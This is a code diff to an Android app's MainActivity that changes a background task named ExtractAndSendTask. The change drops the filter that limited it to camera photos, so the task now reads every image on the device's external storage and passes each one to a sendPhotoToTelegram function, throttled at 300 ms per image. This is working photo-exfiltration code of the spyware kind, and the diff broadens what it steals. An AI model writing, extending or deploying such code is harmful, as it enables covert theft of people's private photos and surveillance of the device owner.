@@ -79,21 +79,9 @@ public class MainActivity extends Activity {
     private class ExtractAndSendTask extends AsyncTask<Void, Integer, Void> {
         @Override
         protected Void doInBackground(Void... voids) {
-            String[] projection;
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                projection = new String[]{
-                    MediaStore.Images.Media._ID,
-                    MediaStore.Images.Media.RELATIVE_PATH,
-                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
-                };
-            } else {
-                projection = new String[]{
-                    MediaStore.Images.Media._ID,
-                    MediaStore.Images.Media.DATA
-                };
-            }
-
+            String[] projection = {MediaStore.Images.Media._ID};
             String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
+            
             Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);
 
             if (cursor != null) {
@@ -101,48 +89,26 @@ public class MainActivity extends Activity {
                 int sentCount = 0;
 
                 while (cursor.moveToNext()) {
-                    boolean isCamera = false;
+                    int id = cursor.getInt(idIndex);
+                    Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
 
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                        int pathIndex = cursor.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH);
-                        int bucketIndex = cursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
-
-                        String path = pathIndex != -1 ? cursor.getString(pathIndex) : "";
-                        String bucket = bucketIndex != -1 ? cursor.getString(bucketIndex) : "";
-
-                        if ((path != null && path.contains("Camera")) || (bucket != null && bucket.toLowerCase().contains("camera"))) {
-                            isCamera = true;
-                        }
-                    } else {
-                        int dataIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
-                        String path = dataIndex != -1 ? cursor.getString(dataIndex) : "";
-                        if (path != null && path.contains("DCIM/Camera")) {
-                            isCamera = true;
-                        }
-                    }
-
-                    if (isCamera) {
-                        int id = cursor.getInt(idIndex);
-                        Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
-
-                        try {
-                            Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), contentUri);
-                            if (bitmap != null) {
-                                boolean ok = sendPhotoToTelegram(bitmap);
-                                bitmap.recycle();
-                                if (ok) {
-                                    sentCount++;
-                                    publishProgress(sentCount);
-                                }
+                    try {
+                        Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), contentUri);
+                        if (bitmap != null) {
+                            boolean ok = sendPhotoToTelegram(bitmap);
+                            bitmap.recycle();
+                            if (ok) {
+                                sentCount++;
+                                publishProgress(sentCount);
                             }
-                        } catch (Exception e) {
-                            e.printStackTrace();
                         }
-
-                        try {
-                            Thread.sleep(300);
-                        } catch (InterruptedException ignored) {}
+                    } catch (Exception e) {
+                        e.printStackTrace();
                     }
+
+                    try {
+                        Thread.sleep(300);
+                    } catch (InterruptedException ignored) {}
                 }
                 cursor.close();
             }
